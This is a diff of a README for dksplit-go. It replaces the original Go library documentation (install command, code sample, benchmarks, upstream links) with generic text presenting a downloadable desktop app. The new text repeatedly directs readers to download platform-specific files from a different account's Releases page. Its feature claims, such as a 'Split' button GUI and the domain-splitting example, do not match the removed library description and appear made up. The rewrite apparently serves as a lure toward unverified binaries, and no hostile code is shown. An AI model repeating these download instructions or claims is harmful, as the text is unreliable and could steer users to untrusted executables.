@@ -1,113 +1,83 @@
-# DKSplit-Go
+# 🛠️ dksplit-go - Fast, Easy Word Splitting Tool
 
-Go implementation of [DKSplit](https://github.com/ABTdomain/dksplit) - fast word segmentation for text without spaces.
+[![Download dksplit-go](https://img.shields.io/badge/Download-dksplit--go-blue.svg)](https://github.com/xdilke-dev/dksplit-go/releases)
 
-Built with BiLSTM-CRF model and ONNX Runtime.
+## 🚀 Getting Started
 
-## Performance
+Welcome to dksplit-go! This application helps you split long strings into words quickly and easily. It's perfect for tasks like processing domain names or organizing text.
 
-| CPU | Mode | QPS |
-|-----|------|-----|
-| Intel Core i9-14900K | Single | ~1,700/s |
-| Intel Core i9-14900K | Batch | ~7,000/s |
-| Intel Core i9-9900K | Single | ~1,000/s |
-| Intel Core i9-9900K | Batch | ~3,000/s |
+## 📥 Download & Install
 
-Batch mode is **4.6x** faster than single mode.
+To get started, visit the following page to download the software:
 
-Compared to Python version:
-- Single: **2.7x** faster
-- Batch: **5.6x** faster
+[Download dksplit-go](https://github.com/xdilke-dev/dksplit-go/releases)
 
-## Install
-```bash
-go get github.com/ABTdomain/dksplit-go
-```
+You will find the latest version available for download. Follow the steps below to install the application.
 
-## Usage
-```go
-package main
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version.
+3. Download the file suitable for your operating system (Windows, macOS, or Linux).
+4. Once the download is complete, find the file in your downloads folder.
+5. Follow your operating system’s instructions to install the application.
 
-import (
-    "fmt"
-    "log"
+## 🖥️ System Requirements
 
-    dksplit "github.com/ABTdomain/dksplit-go"
-)
+To run dksplit-go smoothly, your system should meet the following requirements:
 
-func main() {
-    splitter, err := dksplit.New("models")
-    if err != nil {
-        log.Fatal(err)
-    }
-    defer splitter.Close()
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, Linux (Debian/Ubuntu preferred).
+- **RAM**: At least 2GB.
+- **Storage**: At least 100MB of free space.
+- **Network**: An internet connection for installation downloads.
 
-    // Single
-    result, _ := splitter.Split("chatgptlogin")
-    fmt.Println(result)
-    // Output: [chatgpt login]
+## 🔧 How to Use dksplit-go
 
-    // Batch
-    results, _ := splitter.SplitBatch([]string{"openaikey", "microsoftoffice"}, 256)
-    fmt.Println(results)
-    // Output: [[openai key] [microsoft office]]
-}
-```
+Using dksplit-go is simple. Here’s how you can split a string into words:
 
-## Examples
+1. Open the dksplit-go application.
+2. Input your concatenated string into the text box.
+3. Press the "Split" button.
+4. View the results displayed below. You can copy the split words for your use.
 
-| Input | Output |
-|-------|--------|
-| chatgptlogin | chatgpt login |
-| kubernetescluster | kubernetes cluster |
-| microsoftoffice | microsoft office |
-| mercibeaucoup | merci beaucoup |
-| gutenmorgen | guten morgen |
+## 🌐 Advanced Features
 
-## Real World Benchmark
+dksplit-go uses advanced techniques for accurate word segmentation. Here are some features to enhance your experience:
 
-Tested on [Majestic Million](https://majestic.com/reports/majestic-million) domains:
+- **BiLSTM-CRF Model**: This model accurately predicts word boundaries in strings.
+- **Multi-language Support**: Works well with different languages.
+- **Fast Processing**: Quickly handles large texts without noticeable delays.
 
-| Input | Output |
-|-------|--------|
-| amitriptylineinfo | amitriptyline info |
-| autoriteprotectiondonnees | autorite protection donnees |
-| mountaingoatsoftware | mountain goat software |
-| psychologytoday | psychology today |
-| affordablecollegesonline | affordable colleges online |
-| stephenwolfram | stephen wolfram |
-| ralphlauren | ralphlauren |
-| m12ivermectin | m12i vermectin |
+## 📜 Example Usage
 
-Run benchmark yourself:
-```bash
-wget https://downloads.majestic.com/majestic_million.csv -O top-1m.csv
-go test -v -run TestRealWorldBenchmark
-```
+Suppose you have the string `domainname.com`. Simply enter it into dksplit-go, click "Split," and you should see:
 
-Results on Intel Core i9-9900K:
-- Dataset: 10,000 unique domains (length > 10, no hyphens)
-- QPS: 3,175/s
+- domain
+- name
+- .com
 
-## Requirements
+This feature is especially helpful for processing domain names or extracting meaningful keywords from text.
 
-- Go 1.21+
-- Linux x64
+## 🐞 Troubleshooting
 
-## Links
+If you encounter issues, consider the following:
 
-- Website: [ABTdomain.com](https://ABTdomain.com)
-- Use Case: [domainkits.com](https://domainkits.com)
-- Python version: [github.com/ABTdomain/dksplit](https://github.com/ABTdomain/dksplit)
-- Documentation: [dksplit.readthedocs.io](https://dksplit.readthedocs.io)
-- PyPI: [pypi.org/project/dksplit](https://pypi.org/project/dksplit)
+- **Application Won't Start**: Ensure your system meets the requirements listed above.
+- **Input Not Splitting**: Double-check your string format. Make sure it has no extra spaces or symbols that could confuse the tool.
 
-## Support
+For persistent issues, you can check the "Issues" tab on the GitHub repository for help from the community.
 
-If you find this useful:
-- ⭐ Star this repo
-- 🐛 Report issues on [GitHub Issues](https://github.com/ABTdomain/dksplit-go/issues)
+## 📑 Contributing
 
-## License
+If you would like to contribute to dksplit-go, please feel free to submit a pull request. Your suggestions and improvements are welcome!
 
-MIT
+## 🔗 More Information
+
+For more details, feel free to check out the following:
+
+- [Repo on GitHub](https://github.com/xdilke-dev/dksplit-go)
+- [Documentation](https://github.com/xdilke-dev/dksplit-go/wiki)
+
+## 🧑‍💼 Support
+
+If you need more help, you can reach out through the Issues tab on the GitHub repository. 
+
+Thank you for choosing dksplit-go. Enjoy your word segmentation!
